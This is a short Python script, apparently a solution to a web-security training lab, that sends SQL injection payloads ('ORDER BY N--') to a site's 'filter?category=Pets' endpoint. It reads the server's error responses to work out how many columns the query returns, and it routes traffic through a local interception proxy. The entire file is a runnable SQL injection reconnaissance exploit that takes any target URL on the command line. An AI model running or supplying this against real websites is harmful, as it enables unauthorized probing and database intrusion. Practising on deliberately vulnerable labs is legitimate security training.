import requests
import urllib3
import sys
from bs4 import BeautifulSoup

# Disable any request warning when running our request
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}


def exploit_sqli_column_number(url):
    path = "filter?category=Pets"
    for i in range(1,50):
        print ("i: "+str(i))
        sql_payload = "'+order+by+%s--"%i
        r = requests.get(url+path+sql_payload,verify=False,proxies={"http":"http://127.0.0.1:8080"})
        res = r.text
        if "Internal Server Error" in res:
            return i-1
        i += 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print ("[-] Usage: %s <url>" % sys.argv[0])   
        print ('[-] Example: python3 %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    print ("[+] Figuring number of columns...")
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print ("[+] The number of columns is: " + str(num_col))
    else:
        print ("[-] The SQLi attack was not successful :(")

